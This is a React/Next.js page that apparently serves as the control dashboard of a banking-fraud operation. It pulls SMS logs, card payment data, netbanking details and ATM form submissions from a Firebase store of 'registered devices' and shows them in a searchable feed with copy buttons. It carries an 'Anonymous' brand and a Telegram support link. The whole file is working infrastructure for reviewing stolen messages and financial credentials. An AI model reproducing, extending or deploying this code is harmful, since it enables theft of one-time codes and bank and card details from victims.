"use client";

import { db } from "@/lib/firbase";
import { Card } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { BiCopy } from "react-icons/bi";
import { FaCopy } from "react-icons/fa";
import { useRouter, usePathname } from "next/navigation";
import Link from "next/link";
import LineSpinner from "@/components/LineSpinner";

const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

const INITIAL_BATCH = 20;
const NEXT_BATCH = 20;

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

type SmsRecord = {
  id: string;
  body: string;
  senderNumber: string;
  receiverNumber: string;
  timestamp: string;
  title: string;
  messageId: string;
};

type UnifiedItem = {
  id: string;
  type: "sms" | "form" | "card" | "netbank";
  timestamp: number; // milliseconds
  deviceId: string;
  deviceBrand: string;
  deviceModel: string;
  data: SmsRecord | SubmissionRecord;
};

// Helper: parse any timestamp to milliseconds
function parseTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value < 1_000_000_000_000 ? value * 1000 : value;
  }
  if (typeof value === "string") {
    const trimmed = value.trim();
    if (!trimmed) return 0;
    if (/^\d+$/.test(trimmed)) {
      const numericValue = Number(trimmed);
      return numericValue < 1_000_000_000_000 ? numericValue * 1000 : numericValue;
    }
    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }
  return 0;
}

function formatSmartTime(timestampMs: number) {
  if (!timestampMs || timestampMs <= 0) return "Just now";
  const now = Date.now();
  const diffMs = now - timestampMs;
  if (diffMs <= 0) return "Just now";
  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));
  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;
  return "Just now";
}

function formatTimestamp(value: string) {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return "Unknown time";
  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") return "N/A";
  const keyName = key.toLowerCase();
  if (
    keyName.includes("timestamp") ||
    keyName.includes("createdat") ||
    keyName.includes("updatedat")
  )
    return "";
  if (typeof value === "object") return JSON.stringify(value);
  return String(value);
}

function toSafeText(value: unknown, fallback: string) {
  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed.length > 0 ? trimmed : fallback;
  }
  if (typeof value === "number" || typeof value === "boolean") return String(value);
  return fallback;
}

function toISOTime(value: unknown) {
  const ms = parseTimestamp(value);
  if (ms <= 0) return new Date(0).toISOString();
  return new Date(ms).toISOString();
}

function selectFirstAvailable<T = unknown>(record: Record<string, unknown>, keys: string[]) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) return record[key] as T;
  }
  return undefined;
}

function mapSubmissions(data: unknown): SubmissionRecord[] {
  if (!data || typeof data !== "object") return [];
  return Object.entries(data as Record<string, Record<string, unknown>>).map(([key, value]) => ({
    id: key,
    ...value,
  }));
}

export default function AllDataPage() {
  const [allItems, setAllItems] = useState<UnifiedItem[]>([]);
  const [displayedItems, setDisplayedItems] = useState<UnifiedItem[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [isLoadingMore, setIsLoadingMore] = useState(false);
  const [hasMore, setHasMore] = useState(true);
  const loaderRef = useRef<HTMLDivElement | null>(null);
  const router = useRouter();
  const pathname = usePathname();

  // Fetch all raw data once and convert to unified items
  useEffect(() => {
    const registerDevicesRef = ref(db, "registeredDevices");
    const unsubscribe = onValue(registerDevicesRef, (snapshot) => {
      if (!snapshot.exists()) {
        setAllItems([]);
        setIsLoading(false);
        return;
      }

      const data = snapshot.val() as Record<string, Record<string, unknown>>;
      const items: UnifiedItem[] = [];

      for (const [deviceId, rawDevice] of Object.entries(data)) {
        const brand = typeof rawDevice.brand === "string" ? rawDevice.brand : "Unknown";
        const model = typeof rawDevice.model === "string" ? rawDevice.model : "Unknown";

        // ----- SMS Logs -----
        const smsSource = rawDevice.smsLogs;
        if (smsSource && typeof smsSource === "object") {
          for (const [msgId, payload] of Object.entries(smsSource as Record<string, unknown>)) {
            if (!payload || typeof payload !== "object") continue;
            const smsPayload = payload as Record<string, unknown>;
            const timestampRaw = smsPayload.timestamp;
            const timestampMs = parseTimestamp(timestampRaw);
            if (timestampMs === 0) continue;

            const smsRecord: SmsRecord = {
              id: `${deviceId}-${msgId}`,
              messageId: msgId,
              title: toSafeText(smsPayload.title, "New SMS"),
              body: toSafeText(smsPayload.body, "No message body"),
              senderNumber: toSafeText(smsPayload.senderNumber, "Unknown sender"),
              receiverNumber: toSafeText(smsPayload.receiverNumber ?? smsPayload.reciverNumber, "Unknown receiver"),
              timestamp: toISOTime(timestampRaw),
            };
            items.push({
              id: smsRecord.id,
              type: "sms",
              timestamp: timestampMs,
              deviceId,
              deviceBrand: brand,
              deviceModel: model,
              data: smsRecord,
            });
          }
        }

        // Helper to process submissions
        const processSubmissions = (submissionsArray: SubmissionRecord[], type: UnifiedItem["type"]) => {
          for (const sub of submissionsArray) {
            const timestampRaw = sub.timestamp ?? sub.createdAt ?? sub.updatedAt;
            const timestampMs = parseTimestamp(timestampRaw);
            if (timestampMs === 0) continue;
            items.push({
              id: sub.id,
              type,
              timestamp: timestampMs,
              deviceId,
              deviceBrand: brand,
              deviceModel: model,
              data: sub,
            });
          }
        };

        // ----- Form Submissions -----
        const formsData = selectFirstAvailable(rawDevice, FORM_KEYS);
        const formSubs = mapSubmissions(formsData);
        processSubmissions(formSubs, "form");

        // ----- Card Submissions -----
        const cardData = selectFirstAvailable(rawDevice, CARD_KEYS);
        const cardSubs = mapSubmissions(cardData);
        processSubmissions(cardSubs, "card");

        // ----- NetBanking Submissions -----
        const netData = selectFirstAvailable(rawDevice, NETBANK_KEYS);
        const netSubs = mapSubmissions(netData);
        processSubmissions(netSubs, "netbank");
      }

      // Sort globally by timestamp descending (latest first)
      items.sort((a, b) => b.timestamp - a.timestamp);
      setAllItems(items);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  // Filter based on search query
  const filteredItems = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();
    if (!query) return allItems;

    return allItems.filter((item) => {
      // Search in device info
      if (
        item.deviceId.toLowerCase().includes(query) ||
        item.deviceBrand.toLowerCase().includes(query) ||
        item.deviceModel.toLowerCase().includes(query)
      )
        return true;

      // Search in item data
      if (item.type === "sms") {
        const sms = item.data as SmsRecord;
        return (
          sms.body.toLowerCase().includes(query) ||
          sms.senderNumber.toLowerCase().includes(query) ||
          sms.receiverNumber.toLowerCase().includes(query) ||
          sms.title.toLowerCase().includes(query)
        );
      } else {
        const sub = item.data as SubmissionRecord;
        return Object.values(sub).some((val) =>
          String(val ?? "").toLowerCase().includes(query)
        );
      }
    });
  }, [allItems, searchQuery]);

  // Pagination: reset displayed items when filtered items change
  useEffect(() => {
    setDisplayedItems(filteredItems.slice(0, INITIAL_BATCH));
    setHasMore(filteredItems.length > INITIAL_BATCH);
  }, [filteredItems]);

  // Load more items (infinite scroll)
  const loadMore = useCallback(() => {
    if (isLoadingMore || !hasMore) return;
    setIsLoadingMore(true);
    setTimeout(() => {
      const currentLength = displayedItems.length;
      const nextBatch = filteredItems.slice(currentLength, currentLength + NEXT_BATCH);
      if (nextBatch.length > 0) {
        setDisplayedItems((prev) => [...prev, ...nextBatch]);
      }
      if (currentLength + nextBatch.length >= filteredItems.length) {
        setHasMore(false);
      }
      setIsLoadingMore(false);
    }, 300); // slight delay for smoother UX
  }, [displayedItems.length, filteredItems, hasMore, isLoadingMore]);

  // Intersection Observer for infinite scroll
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0]?.isIntersecting && !isLoadingMore && hasMore) {
          loadMore();
        }
      },
      { rootMargin: "0px 0px 200px 0px", threshold: 0.1 }
    );
    const currentLoader = loaderRef.current;
    if (currentLoader) observer.observe(currentLoader);
    return () => {
      if (currentLoader) observer.unobserve(currentLoader);
      observer.disconnect();
    };
  }, [loadMore, isLoadingMore, hasMore]);

  const copyToClipboard = async (text: string, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    if (typeof window === "undefined") return;
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };

  const handleCardClick = (deviceId: string) => {
    if (deviceId && deviceId !== "Unknown") window.open(`/devices/${deviceId}`, "_blank");
  };

  const renderItem = (item: UnifiedItem) => {
    const deviceName = `${item.deviceBrand} ${item.deviceModel}`.trim();
    const formattedTime = formatTimestamp(new Date(item.timestamp).toISOString());

    if (item.type === "sms") {
      const sms = item.data as SmsRecord;
      return (
        <div
          key={item.id}
          onClick={() => handleCardClick(item.deviceId)}
          style={{ cursor: "pointer" }}
          className="block"
        >
          <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
            <div className="mt-2 space-y-1">
              <div className="flex flex-row items-center justify-between">
                <span className="font-bold text-blue-800">DATE</span>
                <BiCopy onClick={(e) => copyToClipboard(formattedTime, e)} className="cursor-pointer" />
              </div>
              <p className="text-[11px] font-semibold uppercase tracking-wide text-gray-500">{formattedTime}</p>

              <div className="flex flex-row items-center justify-between">
                <span className="font-bold text-blue-800">MSG</span>
                <BiCopy onClick={(e) => copyToClipboard(sms.body, e)} className="cursor-pointer" />
              </div>
              <p className="text-[13px] text-red-600">{sms.body}</p>

              <div className="flex flex-row items-center justify-between">
                <span className="font-bold text-blue-800">SENDER</span>
                <BiCopy onClick={(e) => copyToClipboard(sms.senderNumber, e)} className="cursor-pointer" />
              </div>
              <p className="text-[13px] text-gray-600">{sms.senderNumber}</p>

              {sms.receiverNumber && (
                <>
                  <div className="flex flex-row items-center justify-between">
                    <span className="font-bold text-blue-800">RECEIVER</span>
                    <BiCopy onClick={(e) => copyToClipboard(sms.receiverNumber, e)} className="cursor-pointer" />
                  </div>
                  <p className="text-[13px] text-gray-600">{sms.receiverNumber}</p>
                </>
              )}

              <div className="flex flex-row items-center justify-between">
                <span className="font-bold text-blue-800">DEVICE ID</span>
                <BiCopy onClick={(e) => copyToClipboard(item.deviceId, e)} className="cursor-pointer" />
              </div>
              <p className="text-[13px] text-gray-600 font-mono">{item.deviceId}</p>

              {deviceName !== "Unknown Unknown" && (
                <div className="mt-2 pt-2 border-t border-gray-200">
                  <p className="text-[11px] text-gray-500">📱 {deviceName}</p>
                </div>
              )}
            </div>
          </Card>
        </div>
      );
    } else {
      const sub = item.data as SubmissionRecord;
      // Exclude id and timestamp fields from display
      const displayEntries = Object.entries(sub).filter(
        ([key]) => !key.toLowerCase().includes("timestamp") && !key.toLowerCase().includes("createdat") && !key.toLowerCase().includes("updatedat") && key !== "id"
      );
      return (
        <div
          key={item.id}
          onClick={() => handleCardClick(item.deviceId)}
          style={{ cursor: "pointer" }}
          className="block"
        >
          <Card className="p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)] hover:shadow-[0_6px_20px_rgba(0,0,0,0.12)] transition-all duration-200 active:scale-[0.99]">
            <div className="mt-2 space-y-1">
              <div className="flex flex-row items-center justify-between">
                <span className="font-bold text-blue-800">DEVICE ID</span>
                <BiCopy onClick={(e) => copyToClipboard(item.deviceId, e)} className="cursor-pointer" />
              </div>
              <p className="text-[13px] text-gray-600 font-mono">{item.deviceId}</p>

              {displayEntries.map(([key, value]) => (
                <div key={key} className="flex flex-col gap-1 text-sm text-gray-600">
                  <div className="flex flex-row items-center gap-1">
                    <span className="font-semibold text-blue-800 uppercase">{key}:</span>
                    <FaCopy
                      onClick={(e) => {
                        e.stopPropagation();
                        copyToClipboard(String(value), e);
                      }}
                      className="cursor-pointer"
                    />
                  </div>
                  <span>{formatDisplayValue(key, value)}</span>
                </div>
              ))}

              {deviceName !== "Unknown Unknown" && (
                <div className="mt-2 pt-2 border-t border-gray-200">
                  <p className="text-[11px] text-gray-500">📱 {deviceName}</p>
                </div>
              )}
            </div>
            <div className="flex justify-end mt-2">
              <span className="text-xs text-gray-500">{formatSmartTime(item.timestamp)}</span>
            </div>
          </Card>
        </div>
      );
    }
  };

  return (
    <div className="min-h-screen bg-[#ffffff]">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4 gap-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#8B0000] shrink-0">
            Anonymous
          </Link>
          <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
            <a
              href="https://t.me/vicykrk?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
              target="_blank"
              rel="noopener noreferrer"
              className="text-white/85 transition-colors hover:text-white"
            >
              Support
            </a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        <div className="space-y-5 rounded-[14px] border border-[#d6d6d6] bg-[#f3f3f3] p-5 shadow-[0_4px_20px_rgba(0,0,0,0.1)]">
          <div className="flex items-center gap-3">
            <select
              aria-label="Filter all"
              className="h-12 flex-1 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-4 text-base font-semibold text-[#2f2f2f] outline-none"
              onChange={(e) => router.push(e.target.value)}
              value={pathname}
            >
              <option value="/all">All</option>
              <option value="/messages">Messages</option>
              <option value="/forms">Forms</option>
              <option value="/devices">Devices</option>
            </select>
            <button onClick={() => window.location.reload()} className="h-12 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-6 text-base font-semibold text-[#2f2f2f] transition hover:bg-[#eaeaea]">
              NEW
            </button>
          </div>

          <div className="relative">
            <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-[#8e8e8e]">
              ⌕
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(event) => setSearchQuery(event.target.value)}
              placeholder="Search All Data"
              className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
            />
          </div>
        </div>

        {isLoading ? (
          <LineSpinner />
        ) : displayedItems.length === 0 ? (
          <Card className="surface-card p-10 text-center shadow-[0_4px_16px_rgba(0,0,0,0.08)]">
            <p className="text-lg font-semibold text-(--text-main)">No matching data found</p>
            <p className="mt-2 text-sm text-(--text-muted)">Try a different search term or wait for new data.</p>
          </Card>
        ) : (
          <>
            <div className="space-y-4">{displayedItems.map(renderItem)}</div>
            {(isLoadingMore || hasMore) && (
              <div ref={loaderRef} className="flex justify-center py-4">
                {isLoadingMore && (
                  <div className="flex items-center gap-2 text-gray-500">
                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-blue-600" />
                    <span>Loading more...</span>
                  </div>
                )}
              </div>
            )}
          </>
        )}
      </main>
    </div>
  );
}
